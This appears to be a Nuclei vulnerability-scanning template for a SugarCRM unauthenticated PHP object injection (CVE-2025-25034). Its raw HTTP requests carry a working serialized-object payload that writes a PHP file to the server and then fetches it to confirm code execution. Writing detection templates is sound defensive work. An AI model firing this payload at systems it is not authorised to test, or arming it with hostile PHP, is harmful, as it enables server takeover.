id: CVE-2025-25034

info:
  name: SugarCRM - Unauthenticated Remote Code Execution via PHP Object Injection
  author: Redmomn
  severity: critical
  description: |
    SugarCRM prior to versions 6.5.24, 6.7.13, 7.5.2.5, 7.6.2.2, and 7.7.1.0 is vulnerable to unauthenticated remote code execution via PHP Object Injection. The vulnerability exists in the SugarRestSerialize.php script, where the 'rest_data' POST parameter containing a PHP serialized string is passed unsanitized to the unserialize() PHP function. An attacker can submit a malicious serialized object to gain remote code execution. Earlier advisories and fixes were incomplete, leaving this vector open.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/sugarcrm_rest_unserialize_exec.rb
    - https://support.sugarcrm.com/resources/security/sugarcrm-sa-2016-001/
    - https://nvd.nist.gov/vuln/detail/CVE-2025-25034
  impact: |
    Successful exploitation of this vulnerability allows unauthenticated attackers to execute arbitrary PHP code on the affected server. This can result in full compromise of the system.
  remediation: |
    Update to the latest version.
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    cvss-score: 9.3
    cve-id: CVE-2025-25034
    cwe-id: CWE-502
  metadata:
    verified: true
    vendor: SugarCRM
    fofa-query: app="sugarcrm"
  tags: cve,cve2025,sugarcrm,rce,php,deserialization,unauthenticated

variables:
  num: '99999999'
  filepath: 'custom/{{rand_text_alpha(8)}}.php'

http:
  - raw:
      - |
        POST /service/v4/rest.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=login&input_type=Serialize&rest_data=O:14:"SugarCacheFile":23:{S:17:"\00*\00_cacheFileName";s:22:"../{{filepath}}";S:16:"\00*\00_cacheChanged";b:1;S:14:"\00*\00_localStore";a:1:{i:0;s:30:"<?php echo md5('{{num}}'); ?>";}}

      - |
        GET /{{filepath}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, md5(num)) && status_code_2 == 200'
